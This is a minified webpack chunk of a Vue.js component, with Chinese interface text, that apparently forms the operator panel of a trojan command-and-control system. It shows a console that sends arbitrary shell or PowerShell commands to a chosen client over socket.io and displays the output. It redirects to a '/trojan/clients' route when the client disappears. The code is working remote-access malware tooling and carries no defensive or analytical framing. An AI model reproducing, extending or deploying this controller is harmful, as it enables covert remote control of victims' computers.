(window["webpackJsonp"]=window["webpackJsonp"]||[]).push([["chunk-73fc5d46"],{2357:function(t,e,s){"use strict";s.r(e);var n=function(){var t=this,e=t.$createElement,s=t._self._c||e;return s("div",{attrs:{id:"sshContainer"}},[s("div",{staticClass:"wrapper"},[s("div",[s("span",{staticClass:"backLink",on:{click:function(e){return t.$router.go(-1)}}},[t._v("←返回")])]),s("div",[s("h2",[t._v("客户端ID: "+t._s(t.id))])]),s("div",{attrs:{id:"control-input-group"}},[s("label",{attrs:{for:"sshInput"}},[t._v("请输入终端命令:")]),s("input",{directives:[{name:"model",rawName:"v-model",value:t.sshInput,expression:"sshInput"}],attrs:{type:"text",name:"sshInput"},domProps:{value:t.sshInput},on:{keypress:function(e){return!e.type.indexOf("key")&&t._k(e.keyCode,"enter",13,e.key,"Enter")?null:t.submit.apply(null,arguments)},input:function(e){e.target.composing||(t.sshInput=e.target.value)}}}),s("input",{staticStyle:{"margin-right":"7px"},attrs:{type:"button",value:"提交"},on:{click:t.submit}}),s("input",{directives:[{name:"model",rawName:"v-model",value:t.powershell,expression:"powershell"}],attrs:{name:"powershell",type:"checkbox"},domProps:{checked:Array.isArray(t.powershell)?t._i(t.powershell,null)>-1:t.powershell},on:{change:function(e){var s=t.powershell,n=e.target,r=!!n.checked;if(Array.isArray(s)){var i=null,o=t._i(s,i);n.checked?o<0&&(t.powershell=s.concat([i])):o>-1&&(t.powershell=s.slice(0,o).concat(s.slice(o+1)))}else t.powershell=r}}}),s("label",{staticStyle:{"font-size":"0.6rem"},attrs:{for:"powershell"}},[t._v("PowerShell终端")]),s("button",{staticStyle:{"margin-left":"10px"},on:{click:function(e){t.sshOutput=""}}},[t._v(" 清空下方(ctrl+L) ")]),s("span",{staticStyle:{"margin-left":"10px","font-size":"0.9rem",color:"green"}},[t._v(t._s(t.sshStatus))])]),s("div",{attrs:{id:"sshOutput"}},[s("textarea",{directives:[{name:"model",rawName:"v-model",value:t.sshOutput,expression:"sshOutput"}],ref:"sshOutput",attrs:{name:"sshOutput",id:""},domProps:{value:t.sshOutput},on:{input:function(e){e.target.composing||(t.sshOutput=e.target.value)}}})])])])},r=[],i=s("d4ec"),o=(s("99af"),{name:"control",props:["id"],data:function(){return{clientArr:window.clientArr,sshInput:"",sshOutput:"终端回调结果显示在这里\n",sshStatus:"",interval:null,powershell:!0,shortcut:{clearInput:null}}},watch:{},beforeMount:function(){var t=this,e=function t(){Object(i["a"])(this,t)};this.shortcut.clearInput=document.documentElement.addEventListener("keydown",(function(e){e=e||window.event,"l"==e.key&&e.ctrlKey&&(e.preventDefault(),t.sshOutput="")})),e.IdIndex=function(t){for(var e=0;e<window.clientArr.length;e++)if(window.clientArr[e].id===t)return e;return-1},this.clientArr=window.clientArr,this.interval=setInterval((function(){window.cmdResult.changed&&(t.sshStatus="",""==window.cmdResult.data?t.sshOutput=t.sshOutput.concat("\n当前命令返回了空的回调\n"):t.sshOutput=t.sshOutput.concat(window.cmdResult.data),setTimeout((function(){t.$refs.sshOutput.scrollTop=t.$refs.sshOutput.scrollHeight}),100),window.cmdResult.changed=!1),-1==e.IdIndex(t.id)&&(clearInterval(t.interval),t.$router.push("/trojan/clients"))}),200)},beforeRouteLeave:function(t,e,s){for(var n in window.cmdResult.changed=!1,clearInterval(this.interval),this.shortcut)Object.hasOwnProperty.call(this.shortcut,n)&&this.shortcut[n]&&removeEventListener(this.shortcut[n]);s()},afterRouteEnter:function(t,e,s){s()},methods:{submit:function(){this.sshInput.length&&(this.sshStatus="等待回调...",this.powershell?window.io.emit("apisendcmd",this.id,"powershell -command ".concat(this.sshInput)):window.io.emit("apisendcmd",this.id,this.sshInput))}}}),u=o,l=(s("8c80"),s("2877")),a=Object(l["a"])(u,n,r,!1,null,"07510b3c",null);e["default"]=a.exports},"8c80":function(t,e,s){"use strict";s("ee41")},ee41:function(t,e,s){}}]);
//# sourceMappingURL=chunk-73fc5d46.851ad251.js.map